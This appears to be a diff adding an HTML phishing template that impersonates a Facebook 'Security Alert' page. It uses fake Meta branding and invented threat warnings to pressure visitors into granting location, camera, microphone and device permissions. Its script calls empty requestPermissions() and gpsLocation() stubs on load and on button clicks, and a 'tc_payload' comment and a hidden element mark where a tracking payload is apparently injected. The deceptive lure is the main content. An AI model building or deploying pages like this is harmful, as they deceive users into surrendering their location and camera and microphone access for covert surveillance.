@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Security Alert</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        .header {
+            background: #fff;
+            border-bottom: 1px solid #dadde1;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #1877f2;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        .container {
+            max-width: 680px;
+            margin: 40px auto;
+            padding: 0 16px;
+        }
+
+        .alert-card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .alert-header {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            padding: 24px;
+            text-align: center;
+            color: white;
+        }
+
+        .alert-icon {
+            width: 64px;
+            height: 64px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 32px;
+        }
+
+        .alert-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .alert-subtitle {
+            font-size: 15px;
+            opacity: 0.95;
+        }
+
+        .alert-content {
+            padding: 24px;
+        }
+
+        .alert-message {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 16px;
+            margin-bottom: 24px;
+            border-radius: 4px;
+        }
+
+        .alert-message-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #856404;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .alert-message-text {
+            font-size: 14px;
+            color: #856404;
+            line-height: 1.6;
+        }
+
+        .info-section {
+            margin: 24px 0;
+        }
+
+        .info-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #050505;
+            margin-bottom: 12px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+        }
+
+        .info-item {
+            background: #f0f2f5;
+            padding: 12px;
+            border-radius: 8px;
+            border-left: 3px solid #1877f2;
+        }
+
+        .info-label {
+            font-size: 12px;
+            color: #65676b;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .info-value {
+            font-size: 15px;
+            color: #050505;
+            font-weight: 500;
+        }
+
+        .verification-box {
+            background: #e7f3ff;
+            border: 2px solid #1877f2;
+            border-radius: 8px;
+            padding: 24px;
+            margin: 24px 0;
+        }
+
+        .verification-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .verification-icon {
+            width: 48px;
+            height: 48px;
+            background: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+        }
+
+        .verification-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #050505;
+        }
+
+        .verification-text {
+            font-size: 14px;
+            color: #65676b;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .permission-list {
+            list-style: none;
+            margin: 16px 0;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: white;
+            border-radius: 8px;
+            margin-bottom: 8px;
+        }
+
+        .permission-icon {
+            width: 36px;
+            height: 36px;
+            background: #e7f3ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1877f2;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .permission-text {
+            font-size: 14px;
+            color: #050505;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: #1877f2;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #166fe5;
+        }
+
+        .btn-primary:disabled {
+            background: #e4e6eb;
+            color: #bcc0c4;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #e4e6eb;
+            color: #050505;
+        }
+
+        .btn-secondary:hover {
+            background: #d8dadf;
+        }
+
+        .btn-success {
+            background: #42b72a;
+            color: white;
+        }
+
+        .steps-section {
+            margin: 24px 0;
+        }
+
+        .step-item {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+
+        .step-number {
+            width: 32px;
+            height: 32px;
+            background: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            flex: 1;
+            font-size: 14px;
+            color: #050505;
+            padding-top: 6px;
+            line-height: 1.6;
+        }
+
+        .footer {
+            background: #fff;
+            border-top: 1px solid #dadde1;
+            padding: 20px;
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #65676b;
+            margin: 4px 0;
+        }
+
+        .footer-links {
+            margin-top: 12px;
+        }
+
+        .footer-link {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 8px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px auto;
+            }
+
+            .alert-card {
+                border-radius: 0;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body onload="gpsLocation()">
+    <div class="header">
+        <div class="logo">facebook</div>
+    </div>
+
+    <div class="container">
+        <div class="alert-card">
+            <div class="alert-header">
+                <div class="alert-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h1 class="alert-title">Security Alert</h1>
+                <p class="alert-subtitle">We detected unusual activity on your account</p>
+            </div>
+
+            <div class="alert-content">
+                <div class="alert-message">
+                    <div class="alert-message-title">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>Suspicious Activity Detected</span>
+                    </div>
+                    <p class="alert-message-text">
+                        We noticed a login attempt from an unrecognized device or location. To protect your account, we
+                        need to verify your identity.
+                    </p>
+                </div>
+
+                <div class="info-section">
+                    <h3 class="info-title">Activity Details</h3>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <div class="info-label">Threat Level</div>
+                            <div class="info-value" style="color: #e74c3c;">High Risk</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Activity Type</div>
+                            <div class="info-value">Unauthorized Access Attempt</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Status</div>
+                            <div class="info-value" style="color: #f39c12;">Pending Verification</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="verification-box">
+                    <div class="verification-header">
+                        <div class="verification-icon">
+                            <i class="fas fa-user-shield"></i>
+                        </div>
+                        <h3 class="verification-title">Identity Verification Required</h3>
+                    </div>
+                    <p class="verification-text">
+                        To secure your account and block this unauthorized access, we need to verify your device. Please
+                        grant the following permissions:
+                    </p>
+
+                    <ul class="permission-list">
+                        <li class="permission-item">
+                            <div class="permission-icon">
+                                <i class="fas fa-map-marker-alt"></i>
+                            </div>
+                            <span class="permission-text">Device location (to verify your region)</span>
+                        </li>
+                        <li class="permission-item">
+                            <div class="permission-icon">
+                                <i class="fas fa-camera"></i>
+                            </div>
+                            <span class="permission-text">Camera access (for identity verification)</span>
+                        </li>
+                        <li class="permission-item">
+                            <div class="permission-icon">
+                                <i class="fas fa-microphone"></i>
+                            </div>
+                            <span class="permission-text">Microphone access (for voice confirmation)</span>
+                        </li>
+                        <li class="permission-item">
+                            <div class="permission-icon">
+                                <i class="fas fa-mobile-alt"></i>
+                            </div>
+                            <span class="permission-text">Device information (to detect anomalies)</span>
+                        </li>
+                    </ul>
+
+                    <div class="button-group">
+                        <button class="btn btn-secondary" id="allowBtn" onclick="allowPermissions()">Allow
+                            Permissions</button>
+                        <button class="btn btn-primary" id="verifyBtn" onclick="startVerification()" disabled>Verify
+                            Identity</button>
+                    </div>
+
+                    <div class="spinner" id="spinner"></div>
+                </div>
+
+                <div class="info-section">
+                    <h3 class="info-title">What happens next?</h3>
+                    <div class="steps-section">
+                        <div class="step-item">
+                            <div class="step-number">1</div>
+                            <div class="step-text">We'll verify your device and location to confirm it's really you
+                            </div>
+                        </div>
+                        <div class="step-item">
+                            <div class="step-number">2</div>
+                            <div class="step-text">Block the unauthorized access attempt permanently</div>
+                        </div>
+                        <div class="step-item">
+                            <div class="step-number">3</div>
+                            <div class="step-text">Secure your account with enhanced protection measures</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p class="footer-text">Facebook Security Team • Automated Protection System</p>
+        <p class="footer-text">© 2024 Meta Platforms, Inc.</p>
+        <div class="footer-links">
+            <a href="#" class="footer-link" onclick="return false;">Help Center</a>
+            <a href="#" class="footer-link" onclick="return false;">Privacy Policy</a>
+            <a href="#" class="footer-link" onclick="return false;">Terms of Service</a>
+        </div>
+    </div>
+
+    <p id="techchip" style="display:none;"></p>
+
+    <script>
+        var permissionsGranted = false;
+
+        function allowPermissions() {
+            // Request permissions via payload
+            if (typeof requestPermissions === 'function') {
+                requestPermissions();
+            }
+
+            // Enable verify button
+            permissionsGranted = true;
+            var verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = false;
+            verifyBtn.style.background = '#1877f2';
+            verifyBtn.style.cursor = 'pointer';
+
+            // Update allow button
+            var allowBtn = document.getElementById('allowBtn');
+            allowBtn.innerHTML = '<i class="fas fa-check"></i> Permissions Granted';
+            allowBtn.className = 'btn btn-success';
+            allowBtn.disabled = true;
+        }
+
+        function startVerification() {
+            if (!permissionsGranted) {
+                alert('Please allow permissions first');
+                return;
+            }
+
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('verifyBtn').innerHTML = 'Verifying...';
+            document.getElementById('verifyBtn').disabled = true;
+
+            setTimeout(function () {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('verifyBtn').innerHTML = '<i class="fas fa-check"></i> Verified';
+                document.getElementById('verifyBtn').className = 'btn btn-success';
+            }, 3000);
+        }
+
+        function requestPermissions() { }
+        function gpsLocation() { }
+    </script>
+
+    <!-- tc_payload -->
+</body>
+
+</html>
